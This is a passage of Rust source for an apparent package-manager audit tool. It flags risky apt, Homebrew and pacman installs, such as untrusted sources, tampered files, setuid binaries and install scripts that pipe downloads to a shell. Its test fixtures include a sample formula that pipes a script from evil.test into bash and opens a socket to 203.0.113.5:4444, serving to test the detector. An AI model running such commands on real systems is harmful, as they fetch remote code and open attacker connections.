fn apt_untrusted_sources() -> usize {
    apt_source_files()
        .iter()
        .filter_map(|f| std::fs::read_to_string(f).ok())
        .flat_map(|t| t.lines().map(str::to_string).collect::<Vec<_>>())
        .filter(|l| {
            let l = l.trim();
            (l.starts_with("deb") && l.contains("trusted=yes"))
                || l.eq_ignore_ascii_case("trusted: yes")
        })
        .count()
}

/// Count custom signing keys added to the apt keyring (files in
/// `trusted.gpg.d` / `keyrings` that aren't the official Debian/Ubuntu ones).
fn apt_custom_keys() -> usize {
    ["/etc/apt/trusted.gpg.d", "/etc/apt/keyrings"]
        .iter()
        .filter_map(|d| std::fs::read_dir(d).ok())
        .flatten()
        .flatten()
        .filter(|e| {
            let n = e.file_name().to_string_lossy().to_lowercase();
            !n.starts_with("ubuntu-") && !n.starts_with("debian-") && n != "readme"
        })
        .count()
}

/// The apt source files: `sources.list` + everything under `sources.list.d/`.
fn apt_source_files() -> Vec<std::path::PathBuf> {
    let mut files = vec![std::path::PathBuf::from("/etc/apt/sources.list")];
    if let Ok(dir) = std::fs::read_dir("/etc/apt/sources.list.d") {
        files.extend(dir.flatten().map(|e| e.path()));
    }
    files
}

/// Is the deprecated monolithic `/etc/apt/trusted.gpg` present and non-empty? Keys
/// there are trusted for *every* source (unlike per-repo `signed-by=` keyrings).
fn apt_legacy_keyring() -> bool {
    std::fs::metadata("/etc/apt/trusted.gpg").map(|m| m.len() > 0).unwrap_or(false)
}

/// Every apt keyring file: the legacy `trusted.gpg` + `trusted.gpg.d/` + `keyrings/`.
fn apt_keyring_files() -> Vec<std::path::PathBuf> {
    let mut files = vec![std::path::PathBuf::from("/etc/apt/trusted.gpg")];
    for d in ["/etc/apt/trusted.gpg.d", "/etc/apt/keyrings"] {
        if let Ok(dir) = std::fs::read_dir(d) {
            files.extend(dir.flatten().map(|e| e.path()));
        }
    }
    files
}

/// Count expired signing keys across the apt keyrings. `gpg --show-keys` reads a
/// key file (armored or binary) without importing it; the `pub` record's
/// expiration field (a unix timestamp, index 6) is compared to now. Best-effort:
/// skips files gpg can't read.
fn apt_expired_keys() -> usize {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    if now == 0 {
        return 0;
    }
    apt_keyring_files()
        .iter()
        .map(|f| {
            let Ok(out) =
                Command::new("gpg").args(["--show-keys", "--with-colons"]).arg(f).output()
            else {
                return 0;
            };
            if !out.status.success() {
                return 0;
            }
            String::from_utf8_lossy(&out.stdout)
                .lines()
                .filter(|l| l.starts_with("pub:"))
                .filter(|l| {
                    l.split(':')
                        .nth(6)
                        .and_then(|e| e.parse::<u64>().ok())
                        .is_some_and(|exp| exp != 0 && exp < now)
                })
                .count()
        })
        .sum()
}

/// Count installed files whose content was modified since install (`dpkg --verify`
/// md5 mismatch), excluding conffiles (admins are expected to edit those).
fn apt_modified_files() -> usize {
    let Ok(out) = Command::new("dpkg").arg("--verify").output() else {
        return 0;
    };
    // `dpkg --verify` exits non-zero precisely when it finds discrepancies.
    String::from_utf8_lossy(&out.stdout).lines().filter(|l| dpkg_line_is_tamper(l)).count()
}

/// A `dpkg --verify` line reporting an md5 (content) mismatch on a non-conffile.
/// Format: `<9-flag string> [c] <path>`; the md5 check is flag index 2 (`5` = fail),
/// and a lone `c` middle token marks a conffile.
fn dpkg_line_is_tamper(line: &str) -> bool {
    let toks: Vec<&str> = line.split_whitespace().collect();
    let Some(flags) = toks.first() else {
        return false;
    };
    let md5_changed = flags.chars().nth(2) == Some('5');
    let is_conffile = toks.len() == 3 && toks[1] == "c";
    md5_changed && !is_conffile
}

/// The manually-installed (direct) set, `apt-mark showmanual`. Foreign-arch
/// entries come back qualified (`hello:armhf`) while the graph keys on the bare
/// name, so strip the `:arch` suffix to keep them matchable.
fn apt_manual() -> std::collections::HashSet<String> {
    Command::new("apt-mark")
        .arg("showmanual")
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .lines()
                .map(|l| l.split(':').next().unwrap_or(l).trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

/// Parse `dpkg-query` output into the dependency forest.
fn apt_graph(text: &str, manual: &std::collections::HashSet<String>) -> Vec<Dependency> {
    struct P {
        name: String,
        version: String,
        depends: Vec<String>,
        homepage: String,
    }
    let pkgs: Vec<P> = text
        .lines()
        .filter_map(|line| {
            let f: Vec<&str> = line.split('\t').collect();
            if f.len() < 5 || f[0].is_empty() {
                return None;
            }
            let mut depends = apt_dep_names(f[2]);
            depends.extend(apt_dep_names(f[3])); // Pre-Depends
            Some(P { name: f[0].into(), version: f[1].into(), depends, homepage: f[4].into() })
        })
        .collect();

    let installed: HashMap<&str, ()> = pkgs.iter().map(|p| (p.name.as_str(), ())).collect();
    let mut parents: HashMap<String, Vec<DepRef>> = HashMap::new();
    for p in &pkgs {
        for d in &p.depends {
            if installed.contains_key(d.as_str()) {
                parents.entry(d.clone()).or_default().push((p.name.clone(), p.version.clone()));
            }
        }
    }
    pkgs.into_iter()
        .map(|p| Dependency {
            direct: manual.contains(&p.name),
            resolved_url: (!p.homepage.is_empty()).then(|| p.homepage.clone()),
            parents: parents.remove(&p.name).unwrap_or_default(),
            name: p.name,
            version: p.version,
            ecosystem: Ecosystem::Apt,
            integrity: None,
        })
        .collect()
}

/// A dpkg `Depends`/`Pre-Depends` field → package names: take the first of each
/// comma-separated clause (dropping `| alternatives`), strip a `(version)`
/// constraint and a `:arch` qualifier.
fn apt_dep_names(field: &str) -> Vec<String> {
    field
        .split(',')
        .filter_map(|clause| {
            let first = clause.split('|').next()?.trim();
            let name = first.split('(').next()?.trim();
            let name = name.split(':').next()?.trim();
            (!name.is_empty()).then(|| name.to_string())
        })
        .collect()
}

/// The provenance of an installed package's version: its source (a non-official
/// host / `manual` for a bare `.deb`, `None` for an official archive) and the
/// archive component it came from (`main` / `universe` / `non-free` / …).
struct AptProv {
    source: Option<String>,
    component: Option<String>,
}

/// `apt-cache policy <names…>` → each package's installed-version provenance
/// (source host + archive component). Maps `name → AptProv`. Best-effort; a name
/// missing from the map just has no policy data.
fn apt_provenance(names: &[String]) -> HashMap<String, AptProv> {
    let mut out = HashMap::new();
    for chunk in names.chunks(400) {
        let Ok(res) = Command::new("apt-cache").arg("policy").args(chunk).output() else {
            continue;
        };
        if !res.status.success() {
            continue;
        }
        let text = String::from_utf8_lossy(&res.stdout);
        let mut cur: Option<String> = None;
        let mut in_installed = false;
        for line in text.lines() {
            if !line.starts_with(' ') && line.ends_with(':') {
                cur = Some(line.trim_end_matches(':').to_string());
                in_installed = false;
            } else if line.starts_with(" *** ") {
                in_installed = true; // the installed version's source lines follow
            } else if in_installed && line.trim_start().starts_with(|c: char| c.is_ascii_digit()) {
                // e.g. "  500 http://.../ubuntu jammy/universe amd64 Packages" or
                // "  100 /var/lib/dpkg/status"
                let toks: Vec<&str> = line.split_whitespace().collect();
                let src = toks.get(1).copied().unwrap_or("");
                // The suite/component token ("jammy/universe") → its component half.
                let component =
                    toks.get(2).and_then(|s| s.split('/').nth(1)).map(str::to_string);
                if let Some(host) = host_domain(src) {
                    if let Some(name) = cur.take() {
                        let source = (!apt_official_host(&host)).then_some(host);
                        out.insert(name, AptProv { source, component });
                    }
                    in_installed = false;
                } else if src.starts_with("/var/lib/dpkg") {
                    // Only the local status file backs this version → manual .deb.
                    if let Some(name) = cur.take() {
                        out.insert(name, AptProv { source: Some("manual".into()), component: None });
                    }
                    in_installed = false;
                }
            }
        }
    }
    out
}

/// A less-curated archive component: Ubuntu's community/non-free sections
/// (`universe`/`multiverse`/`restricted`) or Debian's (`contrib`/`non-free`).
fn is_community_component(c: &str) -> bool {
    matches!(
        c,
        "universe" | "multiverse" | "restricted" | "contrib" | "non-free" | "non-free-firmware"
    )
}

/// Packages held back from upgrades (`apt-mark showhold`): pinned to their current
/// version, so they never receive updates (incl. security).
fn apt_held() -> std::collections::HashSet<String> {
    Command::new("apt-mark")
        .arg("showhold")
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).lines().map(str::to_string).collect())
        .unwrap_or_default()
}

/// Packages installed *solely* for a non-native architecture (a pure i386 package
/// on an amd64 host). Maps `name → foreign arch`. Ordinary multiarch libraries
/// (which also have a native copy) are excluded; only fully-foreign packages count.
fn apt_foreign_arch() -> HashMap<String, String> {
    let native = Command::new("dpkg")
        .arg("--print-architecture")
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default();
    if native.is_empty() {
        return HashMap::new();
    }
    let Ok(out) = Command::new("dpkg-query")
        .args(["-W", "-f", "${Package}\t${Architecture}\n"])
        .output()
    else {
        return HashMap::new();
    };
    let mut arches: HashMap<String, Vec<String>> = HashMap::new();
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        let mut it = line.split('\t');
        if let (Some(n), Some(a)) = (it.next(), it.next()) {
            arches.entry(n.to_string()).or_default().push(a.to_string());
        }
    }
    arches
        .into_iter()
        .filter_map(|(name, a)| {
            // Every installed instance is a non-native, concrete arch → fully foreign.
            (!a.is_empty() && a.iter().all(|x| x != &native && x != "all"))
                .then(|| (name, a[0].clone()))
        })
        .collect()
}

/// Count apt pin rules across `/etc/apt/preferences(.d)` — each `Pin:` line forces
/// a version/source/priority, and can hold a package back or prefer a foreign one.
fn apt_pins() -> usize {
    let mut files = vec![std::path::PathBuf::from("/etc/apt/preferences")];
    if let Ok(dir) = std::fs::read_dir("/etc/apt/preferences.d") {
        files.extend(dir.flatten().map(|e| e.path()));
    }
    files
        .iter()
        .filter_map(|f| std::fs::read_to_string(f).ok())
        .map(|t| t.lines().filter(|l| l.trim_start().to_lowercase().starts_with("pin:")).count())
        .sum()
}

/// An official Debian/Ubuntu archive host.
fn apt_official_host(host: &str) -> bool {
    host.ends_with("ubuntu.com") || host.ends_with("debian.org")
}

/// Concatenated maintainer scripts (`preinst`/`postinst`/`prerm`/`postrm`) for a
/// package, from `/var/lib/dpkg/info/`. Empty when it ships none.
fn apt_scripts(name: &str) -> String {
    let mut code = String::new();
    for kind in ["preinst", "postinst", "prerm", "postrm"] {
        if let Ok(c) = std::fs::read_to_string(format!("/var/lib/dpkg/info/{name}.{kind}")) {
            code.push_str(&c);
            code.push('\n');
        }
    }
    code
}

// --- execution & privilege surface --------------------------------------------

/// Index the dpkg file manifests once: `package name → its .list file(s)` (the
/// `:arch` qualifier is folded into the bare name). Reading them per-package in
/// the loop would be O(n²); this is one directory scan.
fn apt_list_index() -> HashMap<String, Vec<std::path::PathBuf>> {
    let mut idx: HashMap<String, Vec<std::path::PathBuf>> = HashMap::new();
    for e in std::fs::read_dir("/var/lib/dpkg/info").into_iter().flatten().flatten() {
        let p = e.path();
        let Some(stem) =
            p.file_name().and_then(|s| s.to_str()).and_then(|f| f.strip_suffix(".list"))
        else {
            continue;
        };
        let name = stem.split(':').next().unwrap_or(stem).to_string();
        idx.entry(name).or_default().push(p);
    }
    idx
}

/// The installed file paths a package ships, read from its dpkg `.list` manifest(s).
fn read_pkg_files(paths: &[std::path::PathBuf]) -> Vec<String> {
    paths
        .iter()
        .filter_map(|p| std::fs::read_to_string(p).ok())
        .flat_map(|t| t.lines().map(str::to_string).collect::<Vec<_>>())
        .collect()
}

/// Setuid/setgid binaries under `/usr` and `/opt` (one `find`, `-perm /6000`).
/// Matched against each package's file list to attribute the binary to its owner.
fn apt_setuid_files() -> std::collections::HashSet<String> {
    Command::new("find")
        .args(["/usr", "/opt", "-xdev", "-type", "f", "-perm", "/6000"])
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).lines().map(str::to_string).collect())
        .unwrap_or_default()
}

/// Package-created dpkg diversions (`dpkg-divert --list`) → `package → diverted
/// path`. The merged-usr transition (`*.usr-is-merged`) and admin-local diversions
/// (no `by <pkg>`) are excluded, leaving genuine file overrides.
fn apt_diversions() -> HashMap<String, String> {
    let Ok(out) = Command::new("dpkg-divert").arg("--list").output() else {
        return HashMap::new();
    };
    let mut map = HashMap::new();
    for l in String::from_utf8_lossy(&out.stdout).lines() {
        let Some(rest) = l.strip_prefix("diversion of ") else { continue };
        let Some((path, after)) = rest.split_once(" to ") else { continue };
        let Some((target, pkg)) = after.rsplit_once(" by ") else { continue };
        if target.trim().ends_with(".usr-is-merged") {
            continue;
        }
        map.entry(pkg.trim().to_string()).or_insert_with(|| path.trim().to_string());
    }
    map
}

/// Signals derived from the files a package installs: a boot service, a scheduled
/// task, auth config, or a setuid/setgid binary. The first three are contextual
/// (Info); a setuid binary is a real privilege-escalation surface (Low).
fn persistence_signals(
    files: &[String],
    setuid: &std::collections::HashSet<String>,
) -> Vec<SysSignal> {
    let mut out = Vec::new();
    if files.iter().any(|f| is_systemd_unit(f, ".service")) {
        out.push(SysSignal::new("installs-service (runs at boot)", Severity::Info, 0));
    }
    if files.iter().any(|f| is_cron_or_timer(f)) {
        out.push(SysSignal::new("installs-scheduled-task (cron/timer)", Severity::Info, 0));
    }
    if files.iter().any(|f| is_auth_config(f)) {
        out.push(SysSignal::new("modifies-auth (sudoers.d/pam)", Severity::Info, 0));
    }
    if let Some(p) = files.iter().find(|f| setuid.contains(f.as_str())) {
        let name = p.rsplit('/').next().unwrap_or(p);
        out.push(SysSignal::new(format!("setuid-binary ({name})"), Severity::Low, 10));
    }
    out
}

/// A systemd unit file of the given kind (`.service` / `.timer`) under a system or
/// user unit directory.
fn is_systemd_unit(f: &str, ext: &str) -> bool {
    f.ends_with(ext) && (f.contains("/systemd/system/") || f.contains("/systemd/user/"))
}

/// A cron job (drop-in dir / crontab / spool) or a systemd timer unit.
fn is_cron_or_timer(f: &str) -> bool {
    const CRON_DIRS: [&str; 5] = [
        "/etc/cron.d/",
        "/etc/cron.hourly/",
        "/etc/cron.daily/",
        "/etc/cron.weekly/",
        "/etc/cron.monthly/",
    ];
    f == "/etc/crontab"
        || f.starts_with("/var/spool/cron/")
        || CRON_DIRS.iter().any(|d| f.starts_with(d))
        || is_systemd_unit(f, ".timer")
}

/// An authentication-config file: sudoers, a sudoers.d drop-in, a PAM service
/// config, or a PAM module.
fn is_auth_config(f: &str) -> bool {
    f == "/etc/sudoers"
        || f.starts_with("/etc/sudoers.d/")
        || f.starts_with("/etc/pam.d/")
        || f.contains("/security/pam_")
}

/// `apt list --upgradable` → `name → (installed, current)`. Best-effort.
fn apt_outdated() -> HashMap<String, (String, String)> {
    let Ok(out) = Command::new("apt").args(["list", "--upgradable"]).output() else {
        return HashMap::new();
    };
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|l| {
            // "name/suite newver arch [upgradable from: oldver]"
            let name = l.split('/').next()?;
            let new = l.split_whitespace().nth(1)?;
            let old = l.split("from: ").nth(1)?.trim_end_matches(']');
            (!name.is_empty() && !name.contains(' '))
                .then(|| (name.to_string(), (old.to_string(), new.to_string())))
        })
        .collect()
}

/// Configured apt sources (`sources.list` + `sources.list.d/`), classic and
/// deb822. Official Debian/Ubuntu archives vs third-party (PPAs / custom).
fn apt_repos() -> Vec<Repo> {
    let mut seen = std::collections::HashSet::new();
    let mut repos = Vec::new();
    for f in apt_source_files() {
        let Ok(text) = std::fs::read_to_string(&f) else { continue };
        for line in text.lines() {
            let l = line.trim();
            // Classic: `deb [opts] URI suite comps`; deb822: `URIs: URI`.
            let uri = if let Some(rest) = l.strip_prefix("deb ").or_else(|| l.strip_prefix("deb-src ")) {
                rest.split_whitespace().find(|t| t.contains("://"))
            } else if let Some(rest) = l.strip_prefix("URIs:") {
                rest.split_whitespace().next()
            } else {
                None
            };
            if let Some(uri) = uri
                && seen.insert(uri.to_string())
            {
                let official = host_domain(uri).is_some_and(|h| apt_official_host(&h));
                repos.push(Repo { name: uri.to_string(), url: String::new(), official });
            }
        }
    }
    repos
}

// --- install-recipe static analysis (third-party packages only) --------------

/// Fetch a package's Homebrew recipe (its Ruby) via `brew cat` and static-analyze
/// it. Only called for third-party packages — the untrusted install code.
fn analyze_install_code(name: &str, is_cask: bool) -> Vec<SysSignal> {
    match brew_cat(name, is_cask) {
        Some(ruby) => analyze_recipe(name, &ruby, "rb"),
        None => Vec::new(),
    }
}

/// `brew cat [--cask] <name>` → the recipe's Ruby source.
fn brew_cat(name: &str, is_cask: bool) -> Option<String> {
    let mut cmd = Command::new("brew");
    cmd.arg("cat");
    if is_cask {
        cmd.arg("--cask");
    }
    let out = cmd.arg(name).output().ok()?;
    out.status
        .success()
        .then(|| String::from_utf8_lossy(&out.stdout).into_owned())
}

/// Static-analyze an install recipe's source (a Homebrew Ruby formula, an Arch
/// PKGBUILD / `.install` shell hook, …). Stages the code as `recipe.<ext>` and
/// runs the full analyzer suite over it (matched by extension), plus a pass for
/// install-time remote code execution. Subprocess-free, so unit-testable on a
/// raw string.
fn analyze_recipe(name: &str, code: &str, ext: &str) -> Vec<SysSignal> {
    let mut sigs = Vec::new();

    if let Some(dir) = stage_recipe(name, code, ext) {
        let findings = crate::analyze::scan_source_tree(&dir);
        let _ = std::fs::remove_dir_all(&dir);
        // Cap so one noisy recipe can't flood the node with signals.
        sigs.extend(findings.iter().take(6).map(finding_to_signal));
    }

    // Piping a download straight into a shell/interpreter during install — the
    // clearest install-time remote-code-execution tell.
    let pipe = regex::Regex::new(r"(?i)(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?(sh|bash|zsh|ruby|python)")
        .expect("static regex");
    if pipe.is_match(code) {
        sigs.push(SysSignal::new("install-remote-exec (pipe to shell)", Severity::High, 40));
    }
    sigs
}

/// A finding from a language analyzer → a system signal, e.g.
/// `install-ioc (203.0.113.5)`. Points scale with severity.
fn finding_to_signal(f: &crate::model::Finding) -> SysSignal {
    let points = match f.severity {
        Severity::Critical | Severity::High => 40,
        Severity::Medium => 20,
        Severity::Low => 10,
        Severity::Info => 0,
    };
    let label =
        format!("install-{} ({})", f.category.as_str(), crate::analyze::util::snippet(&f.detail, 40));
    SysSignal::new(label, f.severity, points)
}

/// Write a recipe to a fresh temp dir as `recipe.<ext>`, so the directory-oriented
/// analyzers pick it up by extension. Returns the dir (caller removes it).
fn stage_recipe(name: &str, code: &str, ext: &str) -> Option<std::path::PathBuf> {
    let safe: String =
        name.chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '_' }).collect();
    let dir = std::env::temp_dir().join(format!("postmortem-recipe-{}-{safe}", std::process::id()));
    std::fs::create_dir_all(&dir).ok()?;
    std::fs::write(dir.join(format!("recipe.{ext}")), code).ok()?;
    Some(dir)
}

/// A cask artifact that runs an installer (`pkg`/`installer`) rather than just
/// dropping an `.app`.
fn is_installer_artifact(a: &serde_json::Value) -> bool {
    a.as_object().is_some_and(|o| o.contains_key("pkg") || o.contains_key("installer"))
}

/// The registrable-ish domain of a URL's host — the last two dot-labels
/// (`dl.google.com` → `google.com`, `github.com` → `github.com`). Naive for
/// multi-part TLDs (`co.uk`), which is acceptable for a coarse host comparison.
fn host_domain(url: &str) -> Option<String> {
    let rest = url.split("://").nth(1).unwrap_or(url);
    let host = rest.split(['/', '?', '#']).next()?;
    let host = host.rsplit('@').next()?; // strip any userinfo
    let host = host.split(':').next()?; // strip port
    let labels: Vec<&str> = host.split('.').filter(|s| !s.is_empty()).collect();
    if labels.len() < 2 {
        return None;
    }
    Some(labels[labels.len() - 2..].join("."))
}

/// `brew tap-info --json --installed` → the configured taps with their **real**
/// git remotes (taps don't follow a fixed `homebrew-<name>` naming; the remote
/// is authoritative, e.g. `sn0walice/sshm` → `github.com/Sn0wAlice/sshm`).
/// Returns the taps plus a `handle → remote` map for the non-official ones (used
/// to resolve their packages). Best-effort: a failure yields none.
fn read_tap_info() -> (Vec<Tap>, HashMap<String, String>) {
    #[derive(Deserialize)]
    struct TapInfo {
        name: String,
        remote: Option<String>,
        #[serde(default)]
        official: bool,
    }
    let Ok(out) = Command::new("brew").args(["tap-info", "--json", "--installed"]).output() else {
        return (Vec::new(), HashMap::new());
    };
    if !out.status.success() {
        return (Vec::new(), HashMap::new());
    }
    let infos: Vec<TapInfo> = serde_json::from_slice(&out.stdout).unwrap_or_default();

    let mut taps = Vec::with_capacity(infos.len());
    let mut remotes = HashMap::new();
    for t in infos {
        if let Some(r) = &t.remote
            && !t.official
        {
            remotes.insert(t.name.clone(), r.clone());
        }
        taps.push(Tap { name: t.name, remote: t.remote.unwrap_or_default(), official: t.official });
    }
    (taps, remotes)
}

/// An official `homebrew/*` tap (core-reviewed, trusted).
fn is_official_tap(tap: &str) -> bool {
    tap.starts_with("homebrew/")
}

// --- risk annotation ----------------------------------------------------------

/// Merge the offline system signals onto the tree, keyed by package name. Each
/// signal raises the node's severity (to at least its own) and adds its risk
/// points, so a package can carry several (e.g. a cask that is both an
/// unverified download and from a third-party tap). Run after
/// [`crate::tree::enrich`] (online) and before [`crate::tree::score`], so
/// `risk:dep` reflects both provenance and repo reputation.
pub fn annotate(tree: &mut Tree, signals: &HashMap<String, Vec<SysSignal>>) {
    fn walk(n: &mut Node, signals: &HashMap<String, Vec<SysSignal>>) {
        if let Some(list) = signals.get(&n.name) {
            for s in list {
                if !n.signals.contains(&s.label) {
                    n.signals.push(s.label.clone());
                }
                n.severity = Some(n.severity.map_or(s.severity, |cur| cur.max(s.severity)));
                n.risk = Some(n.risk.unwrap_or(0).saturating_add(s.points).min(100));
            }
        }
        for c in &mut n.children {
            walk(c, signals);
        }
    }
    for r in &mut tree.roots {
        walk(r, signals);
    }
}

// --- rendering ----------------------------------------------------------------

/// The detection banner: which managers are present, and which postmortem can
/// actually audit. Printed to stderr so it never corrupts `--json` on stdout.
pub fn render_detected(managers: &[Manager]) {
    let names: Vec<String> = managers
        .iter()
        .filter(|m| m.available)
        .map(|m| {
            if m.implemented {
                m.name.green().to_string()
            } else {
                format!("{} {}", m.name, "(detected, not yet supported)".dimmed())
            }
        })
        .collect();
    eprintln!(
        "{} {}",
        "detected package managers:".bold(),
        if names.is_empty() { "none".dimmed().to_string() } else { names.join(", ") }
    );
}

/// The `--repos` view: configured source repos, official first.
pub fn render_repos(inv: &Inventory) {
    println!("{} {}", "source repos".bold(), format!("({})", inv.manager).dimmed());
    if inv.repos.is_empty() {
        println!("  {}", "none configured".dimmed());
        return;
    }
    let (official, third): (Vec<&Repo>, Vec<&Repo>) = inv.repos.iter().partition(|r| r.official);
    for r in official {
        println!("  {}", r.name.green());
    }
    for r in &third {
        let url = if r.url.is_empty() { String::new() } else { format!("[{}]  ", r.url).dimmed().to_string() };
        println!(
            "  {}  {}{}",
            r.name.truecolor(255, 165, 0),
            url,
            "third-party".truecolor(255, 165, 0),
        );
    }
    if !third.is_empty() {
        println!(
            "\n{}",
            format!("⚠ {} third-party source(s) outside the official repos", third.len())
                .truecolor(255, 165, 0)
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tap_classification() {
        assert!(is_official_tap("homebrew/core"));
        assert!(is_official_tap("homebrew/cask"));
        assert!(!is_official_tap("sn0walice/sshm"));
    }

    #[test]
    fn host_domain_extracts_registrable() {
        assert_eq!(host_domain("https://dl.google.com/chrome/x.dmg").as_deref(), Some("google.com"));
        assert_eq!(host_domain("https://github.com/o/r/releases/x").as_deref(), Some("github.com"));
        assert_eq!(host_domain("https://cryptomator.org/").as_deref(), Some("cryptomator.org"));
    }

    #[test]
    fn brew_graph_builds_edges_versions_and_directs() {
        // app (requested) → lib (declared_directly); lib is a transitive-only
        // install. A non-declared edge (app→sysdep) must NOT create an edge.
        let json = br#"{
          "formulae": [
            { "name": "app", "tap": "sn0walice/sshm", "installed": [
                { "version": "1.2.0", "installed_on_request": true,
                  "runtime_dependencies": [
                    { "full_name": "lib", "declared_directly": true },
                    { "full_name": "lib", "declared_directly": false }
                  ] } ] },
            { "name": "lib", "tap": "homebrew/core", "installed": [
                { "version": "0.9.0", "installed_on_request": false,
                  "runtime_dependencies": [] } ] }
          ]
        }"#;
        let tap_remote = HashMap::from([(
            "sn0walice/sshm".to_string(),
            "https://github.com/Sn0wAlice/sshm".to_string(),
        )]);
        let Parsed { deps, casks, signals, .. } = analyze(json, &tap_remote).unwrap();
        assert_eq!(deps.len(), 2);
        assert_eq!(casks, 0);
        let app = deps.iter().find(|d| d.name == "app").unwrap();
        let lib = deps.iter().find(|d| d.name == "lib").unwrap();
        assert!(app.direct, "installed_on_request ⇒ direct/root");
        assert!(!lib.direct, "pulled as a dependency");
        assert_eq!(app.version, "1.2.0");
        assert_eq!(lib.parents, vec![("app".to_string(), "1.2.0".to_string())]);
        assert!(app.parents.is_empty());
        // Third-party tap → provenance signal + its real remote for the resolver.
        assert_eq!(app.resolved_url.as_deref(), Some("https://github.com/Sn0wAlice/sshm"));
        assert_eq!(lib.resolved_url, None);
        assert!(signals["app"].iter().any(|s| s.label.contains("third-party-tap")));
        assert!(!signals.contains_key("lib"));
    }

    #[test]
    fn cask_flags_unverified_and_autoupdate() {
        // A cask with an unverified download, auto-updates, and a pkg installer,
        // from an official tap → the download surface, no tap flag.
        let json = br#"{
          "casks": [
            { "token": "risky", "tap": "homebrew/cask", "installed": "1.0",
              "url": "https://cdn.evil.test/app.dmg", "sha256": "no_check",
              "homepage": "https://vendor.test/", "auto_updates": true,
              "artifacts": [ { "pkg": ["x.pkg"] }, { "uninstall": [] } ] }
          ]
        }"#;
        let Parsed { deps, casks, signals, .. } = analyze(json, &HashMap::new()).unwrap();
        assert_eq!(casks, 1);
        let risky = deps.iter().find(|d| d.name == "risky").unwrap();
        assert!(risky.direct, "casks are user-installed roots");
        assert_eq!(risky.resolved_url.as_deref(), Some("https://cdn.evil.test/app.dmg"));
        let labels: Vec<&str> = signals["risky"].iter().map(|s| s.label.as_str()).collect();
        assert!(labels.iter().any(|l| l.contains("unverified-download")));
        assert!(labels.iter().any(|l| l.contains("download-host-mismatch")));
        assert!(labels.iter().any(|l| l.contains("runs-installer")));
        assert!(labels.iter().any(|l| l.contains("auto-updates")));
        // Worst severity is High (the unverified download).
        assert_eq!(
            signals["risky"].iter().map(|s| s.severity).max(),
            Some(Severity::High)
        );
    }

    #[test]
    fn github_cask_download_is_not_a_host_mismatch() {
        // GitHub releases are a trusted mirror → no host-mismatch flag even
        // though the homepage domain differs.
        let json = br#"{
          "casks": [
            { "token": "ok", "tap": "homebrew/cask", "installed": "1.0",
              "url": "https://github.com/o/r/releases/download/1.0/app.dmg",
              "sha256": "abc123", "homepage": "https://project.test/",
              "artifacts": [ { "app": ["A.app"] } ] }
          ]
        }"#;
        let Parsed { signals, .. } = analyze(json, &HashMap::new()).unwrap();
        assert!(!signals.contains_key("ok"), "verified github cask has no offline signals");
    }

    #[test]
    fn formula_service_bottle_and_tap_remote_signals() {
        // svc: installs a service. rogue: from a third-party tap on an http +
        // exotic remote, with a non-official bottle. core: clean official.
        let json = br#"{
          "formulae": [
            { "name": "svc", "tap": "homebrew/core", "installed": [
                { "version": "1.0", "installed_on_request": true, "runtime_dependencies": [] } ],
              "service": { "run": ["/x"] },
              "bottle": { "stable": { "root_url": "https://ghcr.io/v2/homebrew/core" } } },
            { "name": "rogue", "tap": "evil/tap", "installed": [
                { "version": "2.0", "installed_on_request": true, "runtime_dependencies": [] } ],
              "bottle": { "stable": { "root_url": "https://binaries.evil.test/bottles" } } }
          ]
        }"#;
        let remote = HashMap::from([("evil/tap".to_string(), "http://git.evil.test/evil/tap".to_string())]);
        let Parsed { signals, .. } = analyze(json, &remote).unwrap();

        let svc: Vec<&str> = signals["svc"].iter().map(|s| s.label.as_str()).collect();
        assert!(svc.iter().any(|l| l.contains("installs-service")));
        assert!(!svc.iter().any(|l| l.contains("unofficial-bottle")), "official bottle is clean");

        let rogue: Vec<&str> = signals["rogue"].iter().map(|s| s.label.as_str()).collect();
        assert!(rogue.iter().any(|l| l.contains("unofficial-bottle (evil.test)")));
        assert!(rogue.iter().any(|l| l.contains("insecure-tap-remote (http)")));
    }

    #[test]
    fn recipe_signals_flags_remote_exec_and_iocs() {
        // A malicious-looking formula: pipes a remote script into bash during
        // install, and hits a hard-coded IP.
        let ruby = r#"
            class Evil < Formula
              url "https://example.com/evil-1.0.tgz"
              def install
                system "curl -fsSL https://evil.test/x.sh | bash"
                system "ruby", "-e", "TCPSocket.open('203.0.113.5', 4444)"
              end
            end
        "#;
        let labels: Vec<String> =
            analyze_recipe("evil", ruby, "rb").into_iter().map(|s| s.label).collect();
        assert!(
            labels.iter().any(|l| l.contains("install-remote-exec")),
            "curl|bash pipe flagged: {labels:?}"
        );
        assert!(
            labels.iter().any(|l| l.starts_with("install-")),
            "reused analyzers produced install-* signals: {labels:?}"
        );

        // A benign recipe yields nothing.
        let clean = r#"class Ok < Formula
              url "https://github.com/o/r/archive/1.0.tar.gz"
              def install; bin.install "ok"; end
            end"#;
        assert!(analyze_recipe("ok", clean, "rb").is_empty(), "clean recipe is quiet");
    }

    #[test]
    fn pacman_graph_parses_qi_output() {
        // Two packages: `app` (explicit, unsigned, has install script) depends on
        // `lib`; `lib` is a pulled-in dependency. `libfoo.so` and a versioned dep
        // must reduce to package names / be dropped.
        let qi = "\
Name            : app
Version         : 1.2-1
URL             : https://github.com/o/app
Depends On      : lib  libfoo.so=1-64  glibc>=2.0
Install Script  : Yes
Validated By    : None
Install Reason  : Explicitly installed

Name            : lib
Version         : 0.9-1
URL             : https://example.org/lib
Depends On      : None
Install Script  : No
Validated By    : Signature
Install Reason  : Installed as a dependency of app
";
        let (deps, signals) = pacman_graph(qi);
        assert_eq!(deps.len(), 2);
        let app = deps.iter().find(|d| d.name == "app").unwrap();
        let lib = deps.iter().find(|d| d.name == "lib").unwrap();
